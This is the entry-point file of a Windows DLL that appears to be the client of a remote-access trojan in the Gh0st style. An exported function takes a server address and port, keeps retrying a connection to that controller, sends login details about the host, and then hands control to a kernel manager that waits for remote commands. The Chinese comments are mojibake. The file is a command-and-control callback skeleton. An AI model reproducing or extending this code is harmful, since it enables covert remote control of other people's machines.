// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include "stdafx.h"
#include "IOCPClient.h"
#include "Login.h"
#include "KernelManager.h"

DWORD WINAPI WorkThreadProcedure(LPVOID ParameterData);


char  __ServerIP[MAX_PATH] = { 0 };
unsigned short __ServerPort = 0;
HINSTANCE 	__InstanceHandle;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		//ֻҪ�н��̼�����
		__InstanceHandle = (HINSTANCE)hModule;

		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


//��������

void Run911(char* ServerIP,USHORT ServerPort)
{

	memcpy(__ServerIP, ServerIP, strlen(ServerIP));
	__ServerPort = ServerPort;

	HANDLE ThreadHandle = CreateThread(NULL, 0, 
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure, 
		NULL, 0, NULL);





	WaitForSingleObject(ThreadHandle, INFINITE);
	printf("Client Bye Bye!!!!\r\n");
	CloseHandle(ThreadHandle);
}

DWORD WINAPI WorkThreadProcedure(LPVOID ParameterData)
{
	CIOCPClient ClientObject;
	BOOL  IsOk = FALSE;
	while (1)
	{
		if (IsOk==TRUE)
		{
			break;
		}
		DWORD TickCount = GetTickCount();
		if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		{
			continue;
		}         
		SendLoginInformtion(&ClientObject, GetTickCount() - TickCount);  //���͵�һ������
		CKernelManager	KernelManagerObject(&ClientObject);

		int ReturnValue = 0;
		do
		{

			ReturnValue = WaitForSingleObject(ClientObject.m_EventHandle, 100);  

			ReturnValue = ReturnValue - WAIT_OBJECT_0;

			IsOk  = TRUE;

		} while (ReturnValue != 0);
	}
	return 0;
}

